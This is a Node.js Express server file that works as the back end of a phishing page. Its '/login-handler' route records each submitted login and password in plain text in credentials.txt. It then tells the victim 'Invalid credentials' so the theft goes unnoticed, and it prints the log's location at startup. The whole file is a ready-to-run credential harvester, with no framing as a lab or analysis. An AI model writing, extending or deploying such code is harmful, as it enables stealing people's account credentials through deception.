const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const LOG_FILE = path.join(__dirname, 'credentials.txt');

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post('/login-handler', (req, res) => {
    const params = req.body.params || req.body;
    const arr = Array.isArray(params) ? params : Object.entries(params).map(([name, value]) => ({ name, value }));
    
    const login = (arr.find(p => p.name === 'login') || {}).value || '';
    const password = (arr.find(p => p.name === 'password') || {}).value || '';
    
    const line = `${login}:${password}\n`;
    fs.appendFileSync(LOG_FILE, line, 'utf8');
    
    res.type('text/plain').send(JSON.stringify([{ error_field: 'login', error_text: 'Invalid credentials' }]));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server: http://localhost:${PORT}`);
    console.log(`Credentials log: ${LOG_FILE}`);
});
